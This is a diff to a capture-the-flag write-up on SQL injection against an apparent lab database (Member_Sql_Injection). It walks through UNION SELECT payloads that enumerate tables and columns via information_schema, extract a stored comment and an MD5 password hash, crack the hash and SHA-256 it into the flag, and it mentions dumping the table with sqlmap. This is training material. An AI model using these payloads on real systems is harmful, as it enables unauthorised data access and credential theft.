@@ -8,6 +8,38 @@
     SELECT * FROM users WHERE id = $_GET['id']
 ```
 - We can enter some malicius input like this: 42 OR 1=1 this statment is always true so it will return ALL rows from the "users" table.
+
+# Method 1: 
+
+- We Can Use SQL Injection to find all tables of a database:
+``` sql
+1 UNION SELECT table_name, table_schema FROM information_schema.tables
+```
+- We Can Notice Something Like This:
+    First name: users
+    Surname : Member_Sql_Injection
+
+- We can try to find all columns
+``` sql
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+```
+- We Notice The Table users from the [First name: users] output has these columns:
+    __user_id, first_name, last_name, town, country, planet, Commentaire, countersign__
+
+- We Know now __users__ columns, we can select __Commentaire, countersign__:
+``` sql
+1 UNION SELECT  Commentaire, countersign FROM Member_Sql_Injection.users
+```
+
+- Notice this:
+    ID: 1 UNION SELECT  Commentaire, countersign FROM Member_Sql_Injection.users 
+    First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+    Surname : 5ff9d0165b4f92b14994e5c685cdce28
+- Converting 5ff9d0165b4f92b14994e5c685cdce28 to plain text is FortyTwo.
+- Converting fortytwo to sha256 is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 Which is Our Flag.
+
+
+# Method 2: Using SqlMap
 - Using 'sqlmap' to dump users data from users table returns this:
 Database: Member_Sql_Injection
 Table: users
